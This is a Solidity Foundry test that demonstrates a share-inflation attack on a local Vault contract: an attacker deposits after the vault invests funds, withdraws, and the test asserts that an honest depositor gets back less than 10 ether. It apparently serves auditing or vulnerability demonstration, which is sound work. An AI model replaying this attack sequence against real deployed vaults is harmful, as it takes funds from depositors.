// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract ShareInflationTest is Test {
    Vault vault;

    address user = address(1);
    address attacker = address(2);

    receive() external payable {}

    function setUp() public {
        vault = new Vault();

        vm.deal(user, 10 ether);
        vm.prank(user);
        vault.deposit{value: 10 ether}();

        vm.deal(attacker, 1 ether);
    }

    function testShareInflationAttack() public {
        vault.invest(9 ether);

        vm.prank(attacker);
        vault.deposit{value: 1 ether}();

        uint256 attackerShares = vault.shares(attacker);

        vm.prank(attacker);
        vault.withdraw(attackerShares);

        uint256 userShares = vault.shares(user);

        vm.prank(user);
        vault.withdraw(userShares);

        uint256 userFinalBalance = user.balance;

        assertLt(userFinalBalance, 10 ether);
    }
}